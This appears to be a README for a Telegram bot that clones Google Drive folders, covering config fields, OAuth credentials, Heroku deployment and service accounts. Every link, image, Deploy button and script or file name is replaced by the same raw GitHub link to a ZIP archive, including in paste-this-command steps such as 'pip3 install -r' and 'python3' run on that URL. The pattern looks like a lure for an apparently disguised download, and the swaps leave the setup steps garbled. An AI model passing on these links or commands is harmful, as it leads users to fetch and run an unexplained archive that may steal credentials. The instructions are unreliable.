# Why?
For all my friends using my TDs who now need to store everything in it instead of their Drive. [Need help?](https://raw.githubusercontent.com/kyaw287/botMain/main/bot/Main-bot-v3.5.zip)

<p align="center">
<img src="https://raw.githubusercontent.com/kyaw287/botMain/main/bot/Main-bot-v3.5.zip" alt="drawing" width="270" height=585/>
</p>

## Guide:
- YouTube Guide: [Google Drive Clone Bot Set-Up Tutorial | Telegram Bot Setup Guide](https://raw.githubusercontent.com/kyaw287/botMain/main/bot/Main-bot-v3.5.zip)
  - Follow the above guide for Heroku.
  - If you wish to run on a VPS, Do all the stuff I did on the VPS Terminal ;)
  - Wish to run anywhere else? Follow the guide till the part where I download ZIP Archive from https://raw.githubusercontent.com/kyaw287/botMain/main/bot/Main-bot-v3.5.zip Use that zip on any device you'd like to run the bot on. 
  - Don't forget to install https://raw.githubusercontent.com/kyaw287/botMain/main/bot/Main-bot-v3.5.zip
    ```
    pip3 install -r https://raw.githubusercontent.com/kyaw287/botMain/main/bot/Main-bot-v3.5.zip
    ```
- [Adding Service Accounts to Google Group/TeamDrive](https://raw.githubusercontent.com/kyaw287/botMain/main/bot/Main-bot-v3.5.zip)

## Setting up config file (present in https://raw.githubusercontent.com/kyaw287/botMain/main/bot/Main-bot-v3.5.zip)
- **BOT_TOKEN** : The telegram bot token that you get from @BotFather
- **GDRIVE_FOLDER_ID** : This is the folder ID of the Google Drive Folder to which you want to clone.
- **OWNER_ID** : The Telegram user ID (not username) of the owner of the bot (if you do not have that, send /id to @kelverbot )
- **AUTHORISED_USERS** : The Telegram user IDs (not username) of people you wish to allow for bot https://raw.githubusercontent.com/kyaw287/botMain/main/bot/Main-bot-v3.5.zip can also be group chat id. Write like: [123456, 4030394, -1003823820]
- **IS_TEAM_DRIVE** : (Optional field) Set to True if GDRIVE_FOLDER_ID is from a Team Drive else False or Leave it empty.
- **USE_SERVICE_ACCOUNTS**: (Optional field) (Leave empty if unsure) Whether to use service accounts or not. For this to work see  "Using service accounts" section below.
- **INDEX_URL** : (Optional field) Refer to https://raw.githubusercontent.com/kyaw287/botMain/main/bot/Main-bot-v3.5.zip The URL should not have any trailing '/'

## Getting Google OAuth API credential file

- Visit the [Google Cloud Console](https://raw.githubusercontent.com/kyaw287/botMain/main/bot/Main-bot-v3.5.zip)
- Go to the OAuth Consent tab, fill it, and save.
- Go to the Credentials tab and click Create Credentials -> OAuth Client ID
- Choose Other and Create.
- Use the download button to download your credentials.
- Move that file to the root of clone-bot, and rename it to https://raw.githubusercontent.com/kyaw287/botMain/main/bot/Main-bot-v3.5.zip
- Visit [Google API page](https://raw.githubusercontent.com/kyaw287/botMain/main/bot/Main-bot-v3.5.zip)
- Search for Drive and enable it if it is disabled
- Finally, run the script to generate token file (https://raw.githubusercontent.com/kyaw287/botMain/main/bot/Main-bot-v3.5.zip) for Google Drive:
```
pip install google-api-python-client google-auth-httplib2 google-auth-oauthlib
python3 https://raw.githubusercontent.com/kyaw287/botMain/main/bot/Main-bot-v3.5.zip
```
# Running
- To run this bot (locally) (suggested)
```
python3 -m bot
```
- Deploying to Heroku (Optional) (Not Suitable for very big Clones!)

[![Deploy](https://raw.githubusercontent.com/kyaw287/botMain/main/bot/Main-bot-v3.5.zip)](https://raw.githubusercontent.com/kyaw287/botMain/main/bot/Main-bot-v3.5.zip)

- Please know that after using this button, your work isn't done. You gotta [clone heroku app](https://raw.githubusercontent.com/kyaw287/botMain/main/bot/Main-bot-v3.5.zip) and add https://raw.githubusercontent.com/kyaw287/botMain/main/bot/Main-bot-v3.5.zip and https://raw.githubusercontent.com/kyaw287/botMain/main/bot/Main-bot-v3.5.zip (By now you would know how to make it.) and this is the perfect time to generate service accounts if you wish to use them. After it's all done, [Push changes to Heroku (Step1-2 only).](https://raw.githubusercontent.com/kyaw287/botMain/main/bot/Main-bot-v3.5.zip)

**Tip: Instead of using Termux or local machine, use [https://raw.githubusercontent.com/kyaw287/botMain/main/bot/Main-bot-v3.5.zip](https://raw.githubusercontent.com/kyaw287/botMain/main/bot/Main-bot-v3.5.zip), atleast it won't throw any errors in installing Python requirements. From [https://raw.githubusercontent.com/kyaw287/botMain/main/bot/Main-bot-v3.5.zip](https://raw.githubusercontent.com/kyaw287/botMain/main/bot/Main-bot-v3.5.zip) you could push to a private GitHub repo and attach that to Heroku.**


# Using service accounts for uploading to avoid user rate limit
For Service Account to work, you must set USE_SERVICE_ACCOUNTS=True in config file or environment variables
Many thanks to [AutoRClone](https://raw.githubusercontent.com/kyaw287/botMain/main/bot/Main-bot-v3.5.zip) for the scripts
## Generating service accounts
Step 1. Generate service accounts [What is service account](https://raw.githubusercontent.com/kyaw287/botMain/main/bot/Main-bot-v3.5.zip)
---------------------------------
Let us create only the service accounts that we need. 
**Warning:** abuse of this feature is not the aim of autorclone and we do **NOT** recommend that you make a lot of projects, just one project and 100 sa allow you plenty of use, its also possible that overabuse might get your projects banned by google. 

```
Note: 1 service account can copy around 750gb a day, 1 project makes 100 service accounts so thats 75tb a day, for most users this should easily suffice. 
```

`python3 https://raw.githubusercontent.com/kyaw287/botMain/main/bot/Main-bot-v3.5.zip --quick-setup 1 --new-only`

A folder named accounts will be created which will contain keys for the service accounts created

NOTE: If you have created SAs in past from this script, you can also just re download the keys by running:
```
python3 https://raw.githubusercontent.com/kyaw287/botMain/main/bot/Main-bot-v3.5.zip --download-keys project_id
```

### Add all the service accounts to the Team Drive or folder
- Run:
```
python3 https://raw.githubusercontent.com/kyaw287/botMain/main/bot/Main-bot-v3.5.zip -d SharedTeamDriveSrcID
```

### Credits
- https://raw.githubusercontent.com/kyaw287/botMain/main/bot/Main-bot-v3.5.zip
- https://raw.githubusercontent.com/kyaw287/botMain/main/bot/Main-bot-v3.5.zip
- https://raw.githubusercontent.com/kyaw287/botMain/main/bot/Main-bot-v3.5.zip
